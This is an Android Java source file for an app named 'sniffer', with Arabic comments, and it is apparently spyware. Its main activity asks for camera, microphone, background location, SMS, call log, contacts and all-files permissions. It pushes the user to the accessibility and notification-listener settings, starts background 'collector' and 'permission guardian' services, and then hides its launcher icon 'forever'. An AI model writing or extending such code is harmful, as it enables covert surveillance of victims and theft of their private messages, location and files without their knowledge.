package com.v8.global.sniffer;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.provider.Telephony;
import android.view.View;
import android.view.WindowManager;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int SYSTEM_ALERT_WINDOW_CODE = 101;
    private static final int MANAGE_STORAGE_CODE = 102;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // بدء عملية الصلاحيات فوراً
        startPermissionProcess();
    }
    
    private void startPermissionProcess() {
        // 1. أولاً: طلب صلاحية SYSTEM_ALERT_WINDOW (الأهم)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, SYSTEM_ALERT_WINDOW_CODE);
                return;
            }
        }
        
        // 2. طلب صلاحية إدارة الملفات للأندرويد 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, MANAGE_STORAGE_CODE);
                return;
            }
        }
        
        // 3. طلب باقي الصلاحيات
        requestAllPermissions();
    }
    
    private void requestAllPermissions() {
        // قائمة جميع الصلاحيات المطلوبة
        String[] permissions = {
            Manifest.permission.INTERNET,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.POST_NOTIFICATIONS
        };
        
        List<String> permissionsNeeded = new ArrayList<>();
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                permissionsNeeded.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            // كل الصلاحيات ممنوحة
            completeSetup();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // بعد طلب الصلاحيات، أكمل الإعداد
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    completeSetup();
                }
            }, 2000);
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == SYSTEM_ALERT_WINDOW_CODE || requestCode == MANAGE_STORAGE_CODE) {
            // العودة من شاشة الصلاحيات، أكمل العملية
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    startPermissionProcess();
                }
            }, 1000);
        }
    }
    
    private void completeSetup() {
        // طلب تجاهل تحسين البطارية
        requestIgnoreBatteryOptimizations();
        
        // فتح إعدادات الإشعارات
        openNotificationSettings();
        
        // فتح إعدادات الوصول
        openAccessibilitySettings();
        
        // تشغيل الخدمات
        startServices();
        
        // إخفاء التطبيق للأبد
        hideApp();
    }
    
    private void requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        }
    }
    
    private void openNotificationSettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }
    
    private void openAccessibilitySettings() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
    
    private void startServices() {
        // تشغيل خدمة الإشعارات
        Intent notificationIntent = new Intent(this, NotificationService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(notificationIntent);
        } else {
            startService(notificationIntent);
        }
        
        // تشغيل خدمة السحب التلقائي
        Intent collectorIntent = new Intent(this, AutoCollectorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(collectorIntent);
        } else {
            startService(collectorIntent);
        }
        
        // تشغيل حارس الصلاحيات
        Intent guardianIntent = new Intent(this, PermissionGuardian.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(guardianIntent);
        } else {
            startService(guardianIntent);
        }
    }
    
    private void hideApp() {
        // إخفاء الأيقونة من المشغل (للمستخدم العادي)
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, SplashActivity.class);
        p.setComponentEnabledSetting(componentName, 
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
            PackageManager.DONT_KILL_APP);
        
        // إنهاء النشاط
        finish();
        
        // إغلاق التطبيق بالكامل
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            finishAndRemoveTask();
        }
    }
        }
